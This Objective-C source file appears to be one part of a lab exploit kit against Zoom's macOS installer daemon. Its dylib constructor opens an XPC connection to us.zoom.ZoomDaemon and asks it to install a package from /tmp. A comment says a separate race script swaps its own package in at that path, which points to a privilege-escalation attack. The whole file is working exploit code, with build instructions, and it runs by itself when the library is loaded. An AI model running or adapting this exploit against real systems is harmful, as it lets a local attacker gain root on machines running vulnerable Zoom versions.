/*
 * Reference — XPC to us.zoom.ZoomDaemon (installNewZoomPackage:…).
 * Normally loaded via dylib constructor path in zoom_exploit_lab.sh, not run as standalone.
 *
 * Build (example x86_64 dylib host):
 *   gcc -arch x86_64 -dynamiclib -framework Foundation zoomxpc.m -o zoomxpc.dylib
 */

#import <Foundation/Foundation.h>

static NSString *XPCHelperMachServiceName = @"us.zoom.ZoomDaemon";

@protocol ZMDaemonXPCProtocol
- (void)uninstallDaemonHelperWithReply:(void (^)(BOOL, NSString *))arg1;
- (void)installNewZoomPackage:(NSString *)arg1
                    processID:(long long)arg2
                        reply:(void (^)(BOOL, NSString *))arg3;
- (void)exitDaemonHelperWithReply:(void (^)(BOOL, NSString *))arg1;
- (void)runDaemonHelperWithReply:(void (^)(BOOL))arg1;
@end

__attribute__((constructor)) static void constructor(void)
{
	@autoreleasepool {
		NSXPCConnection *connection =
		    [[NSXPCConnection alloc] initWithMachServiceName:XPCHelperMachServiceName
		                                           options:4096];

		[connection setRemoteObjectInterface:[NSXPCInterface
		                         interfaceWithProtocol:@protocol(ZMDaemonXPCProtocol)]];

		[connection resume];

		id obj = [connection remoteObjectProxyWithErrorHandler:^(NSError *error) {
			(void)error;
			NSLog(@"Connection Failure");
		}];

		/* Path must match the pkg the race script swaps in — edit for your VM layout */
		[obj installNewZoomPackage:@"/tmp/ZoomInstallerIT-5.8.3.pkg"
		                 processID:33333
		                     reply:^(BOOL e, NSString *s) {
			                     NSLog(@"Response: %hhd & %@", e, s);
		                     }];
		NSLog(@"Done");
	}
}
